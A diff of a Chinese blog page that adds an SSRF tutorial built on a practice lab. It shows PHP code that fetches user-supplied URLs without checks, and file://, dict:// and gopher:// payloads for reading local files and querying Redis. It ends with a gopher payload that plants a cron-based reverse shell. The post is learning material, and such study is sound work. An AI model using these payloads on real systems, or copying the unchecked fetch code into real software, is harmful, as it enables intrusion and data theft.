@@ -119,17 +119,19 @@
 
 
 
-<meta name="description" content="ssrf，即服务端请求伪造；黑客可以告诉服务器一个地址，服务器负责去请求这个网址">
+<meta name="description" content="ssrf，即服务端请求伪造，产生的原因是告诉服务器一个网址，服务器没有进行判断、过滤，而直接去请求这个网址">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ssrf学习(一)">
 <meta property="og:url" content="http://yoursite.com/2019/07/18/ssrf学习-一/index.html">
 <meta property="og:site_name" content="gtfly">
-<meta property="og:description" content="ssrf，即服务端请求伪造；黑客可以告诉服务器一个地址，服务器负责去请求这个网址">
+<meta property="og:description" content="ssrf，即服务端请求伪造，产生的原因是告诉服务器一个网址，服务器没有进行判断、过滤，而直接去请求这个网址">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-07-19T01:49:39.231Z">
+<meta property="og:image" content="https://imgur.com/GdSykss.png">
+<meta property="og:updated_time" content="2019-07-23T11:29:57.495Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ssrf学习(一)">
-<meta name="twitter:description" content="ssrf，即服务端请求伪造；黑客可以告诉服务器一个地址，服务器负责去请求这个网址">
+<meta name="twitter:description" content="ssrf，即服务端请求伪造，产生的原因是告诉服务器一个网址，服务器没有进行判断、过滤，而直接去请求这个网址">
+<meta name="twitter:image" content="https://imgur.com/GdSykss.png">
 
 
 
@@ -395,8 +397,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-07-19T09:49:39+08:00">
-                2019-07-19
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-23T19:29:57+08:00">
+                2019-07-23
               </time>
             
           </span>
@@ -492,12 +494,85 @@
       
 
       
-        <p>ssrf，即服务端请求伪造；黑客可以告诉服务器一个地址，服务器负责去请求这个网址</p>
+        <p>ssrf，即服务端请求伪造，产生的原因是告诉服务器一个网址，服务器没有进行判断、过滤，而直接去请求这个网址</p>
 <a id="more"></a>
 
+<p><img src="https://imgur.com/GdSykss.png" alt></p>
+<p>图片来自：<a href="https://www.cnblogs.com/p0pl4r/p/10336501.html" target="_blank" rel="noopener">https://www.cnblogs.com/p0pl4r/p/10336501.html</a></p>
 <p>练习环境地址：<a href="https://github.com/m6a-UdS/ssrf-lab" target="_blank" rel="noopener">https://github.com/m6a-UdS/ssrf-lab</a></p>
+<p>把练习环境git下来后，还要配置php.ini，因为不设置的话curl相关函数默认是不能使用的，设置好<code>extension_dir</code>，目录下如果没有<code>curl.so</code>需要<code>apt-get php5.6-curl</code>，将<code>php_curl.dll</code>前的分号删掉，并把后缀dll改为so，最后重启服务即可</p>
+<h3 id="相关实现函数"><a href="#相关实现函数" class="headerlink" title="相关实现函数"></a>相关实现函数</h3><h4 id="0x01-curl实现"><a href="#0x01-curl实现" class="headerlink" title="0x01.curl实现"></a>0x01.curl实现</h4><p>第一关有一个输入框，可以输入网址，点击TEST IT后下方会显示获取的内容，直接输入<code>http://127.0.0.1</code>，下方会显示获取的这个网页的内容；进行抓包，获取的请求信息如下：</p>
+<pre><code>POST /ssrf/testhook.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 30
+Connection: keep-alive
+Referer: http://127.0.0.1/ssrf/
+
+handler=http%3A%2F%2F127.0.0.1</code></pre><p>handler字段即为输入的内容，目标文件是<code>testhook.php</code>，查看这个文件的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="comment">// create curl resource </span></span><br><span class="line">	$ch = curl_init(); </span><br><span class="line"></span><br><span class="line">	<span class="comment">// set url </span></span><br><span class="line">	curl_setopt($ch, CURLOPT_URL, $_POST[<span class="string">"handler"</span>]); </span><br><span class="line"></span><br><span class="line">	<span class="comment">//return the transfer as a string </span></span><br><span class="line">	curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">	<span class="comment">// $output contains the output string </span></span><br><span class="line">	$output = curl_exec($ch); </span><br><span class="line"></span><br><span class="line">	<span class="comment">// close curl resource to free up system resources </span></span><br><span class="line">	curl_close($ch);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $output;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码中各函数作用：</p>
+<p>1.curl_init() ：初始化cURL会话，返回cURL句柄，供curl_setopt()、curl_exec()和curl_close()函数使用</p>
+<p>2.curl_setopt() ：设置cURL传输选项，语法：</p>
+<pre><code>curl_setopt ( resource $ch , int $option , mixed $value ) : bool</code></pre><p>参数：</p>
+<ul>
+<li><p>ch：由 curl_init() 返回的 cURL 句柄。</p>
+</li>
+<li><p>option：需要设置的CURLOPT_XXX选项。</p>
+<ul>
+<li>CURLOPT_URL：需要获取的 URL 地址，也可以在curl_init() 初始化会话的时候。 </li>
+<li>CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以字符串返回，而不是直接输出。</li>
+</ul>
+</li>
+<li><p>value：将设置在option选项上的值。 </p>
+</li>
+</ul>
+<p>3.curl_exec() ：执行给定的cURL会话，成功返回TRUE，失败返回FALSE；当设置CURLOPT_RETURNTRANSFER选项时，执行成功返回执行结果，失败返回FALSE</p>
+<p>4.curl_close() ：关闭cURL会话并且释放所有资源</p>
+<h4 id="0x02-file-get-contents-实现"><a href="#0x02-file-get-contents-实现" class="headerlink" title="0x02.file_get_contents()实现"></a>0x02.file_get_contents()实现</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = file_get_contents($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>
+
+<h4 id="fsockopen-实现"><a href="#fsockopen-实现" class="headerlink" title="fsockopen()实现"></a>fsockopen()实现</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">$fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">$out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">$out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">$out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">$out .= <span class="string">"\r\n"</span>; </span><br><span class="line">fwrite($fp, $out); </span><br><span class="line">$contents=<span class="string">''</span>; </span><br><span class="line"><span class="keyword">while</span> (!feof($fp)) &#123; </span><br><span class="line">$contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">&#125; </span><br><span class="line">fclose($fp); </span><br><span class="line"><span class="keyword">return</span> $contents; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>fsockopen() : 初始化一个套接字连接到指定主机;fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用</p>
+<h3 id="url-scheme"><a href="#url-scheme" class="headerlink" title="url scheme"></a>url scheme</h3><p>可以通过<code>curl -V</code>来查看curl支持的协议</p>
+<pre><code>└─(17:20:57)──&gt; curl -V
+curl 7.58.0 (x86_64-pc-linux-gnu) libcurl/7.58.0 OpenSSL/1.1.1 zlib/1.2.11 libidn2/2.0.4 libpsl/0.19.1 (+libidn2/2.0.4) nghttp2/1.30.0 librtmp/2.3
+Release-Date: 2018-01-24
+Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp 
+Features: AsynchDNS IDN IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz TLS-SRP HTTP2 UnixSockets HTTPS-proxy PSL </code></pre><p>可以看到：Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp </p>
+<h4 id="http-s"><a href="#http-s" class="headerlink" title="http/s"></a>http/s</h4><p>主要用来探测内网服务，如<code>url=http://127.0.0.1</code></p>
+<h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>从文件系统中获取本地文件内容，如<code>url=file:///var/www/html/index.php</code></p>
+<h4 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h4><p>可以发送请求获取信息，如<code>url=dict://127.0.0.1:6379/info</code>可获取本地redis服务配置信息</p>
+<p>Redis是一个开源的，使用C语言编写，高性能的key-value存储系统，在ubuntu下可以通过下列命令安装：</p>
+<pre><code>$sudo apt-get update
+$sudo apt-get install redis-server</code></pre><p>启动 Redis 服务，默认端口为6379</p>
+<pre><code>$ redis-server</code></pre><p>启动 Redis 客户端：</p>
+<pre><code>$ redis-cli</code></pre><p>一些基本操作：</p>
+<p>1.通过<code>SET key value</code>的方式设置键值：</p>
+<pre><code>127.0.0.1:6379&gt; set a 666
+OK</code></pre><p>2.通过<code>GET key</code>的方式获取键对应的值：</p>
+<pre><code>127.0.0.1:6379&gt; GET a
+&quot;666&quot;</code></pre><p>3.通过<code>KEYS *</code>命令获取所有键：</p>
+<pre><code>127.0.0.1:6379&gt; KEYS *
+1) &quot;a&quot;</code></pre><p>详细教程：<a href="https://www.runoob.com/redis/redis-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/redis/redis-tutorial.html</a></p>
+<p>可以用dict协议获取redis存储的数据，如：</p>
+<pre><code>url=dict://127.0.0.1:6379/KEYS * 可获取redis存储的所有键；
+url=dict://127.0.0.1:6379/GET key 可获取键`key`对应的值；</code></pre><h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h4><p>gopher协议支持发出GET、POST请求，可以用来反弹shell</p>
+<p>首先在本地监听1234端口：</p>
+<pre><code>nc -lvp 1234</code></pre><p>之后使用gopher协议：</p>
+<pre><code>curl -v -d &apos;handler=gopher://127.0.0.1:1234/_test&apos; &apos;http://127.0.0.1/ssrf/testhook.php&apos;</code></pre><p>其中，<code>-v</code>参数显示详细信息，<code>-d</code>指定以POST发送数据；</p>
+<p>之后，可以看到监听界面显示了发送过去的<code>test</code>信息；可以使用gopher协议配合redis反弹shell或攻击fastcig来拿到shell</p>
+<p>攻击Redis的反弹shell POC：</p>
+<p>gopher://127.0.0.1:6379/_<em>1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a</em>/1 * * * * bash -i &gt;&amp; /dev/tcp/0.0.0.0/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</p>
+<p>执行后即可在Redis看到键<code>1</code>和值<code>bash -i &gt;&amp; /dev/tcp/0.0.0.0/2333 0&gt;&amp;1</code>被写入了;</p>
 <hr>
-<p>参考文章：<br><a href="https://mp.weixin.qq.com/s/FXInesMfXaz1l9DibxmMKw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/FXInesMfXaz1l9DibxmMKw</a><br><a href="https://mp.weixin.qq.com/s/bjjChubAvo8iOUYYU78uaw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/bjjChubAvo8iOUYYU78uaw</a></p>
+<p>参考文章：<br><a href="https://mp.weixin.qq.com/s/FXInesMfXaz1l9DibxmMKw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/FXInesMfXaz1l9DibxmMKw</a><br><a href="https://mp.weixin.qq.com/s/bjjChubAvo8iOUYYU78uaw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/bjjChubAvo8iOUYYU78uaw</a><br><a href="https://joychou.org/web/phpssrf.html#directory0326919633843317466" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html#directory0326919633843317466</a></p>
 
       
     </div>
@@ -589,6 +664,10 @@
 
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/2019/07/21/ssrf学习-二/" rel="prev" title="ssrf学习(二)">
+                ssrf学习(二) <i class="fa fa-chevron-right"></i>
+              </a>
+            
           </div>
         </div>
       
@@ -644,8 +723,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -660,7 +748,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">152</span>
+                  <span class="site-state-item-count">154</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -765,6 +853,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#相关实现函数"><span class="nav-number">1.</span> <span class="nav-text">相关实现函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-curl实现"><span class="nav-number">1.1.</span> <span class="nav-text">0x01.curl实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-file-get-contents-实现"><span class="nav-number">1.2.</span> <span class="nav-text">0x02.file_get_contents()实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fsockopen-实现"><span class="nav-number">1.3.</span> <span class="nav-text">fsockopen()实现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#url-scheme"><span class="nav-number">2.</span> <span class="nav-text">url scheme</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#http-s"><span class="nav-number">2.1.</span> <span class="nav-text">http/s</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file"><span class="nav-number">2.2.</span> <span class="nav-text">file</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dict"><span class="nav-number">2.3.</span> <span class="nav-text">dict</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher"><span class="nav-number">2.4.</span> <span class="nav-text">gopher</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
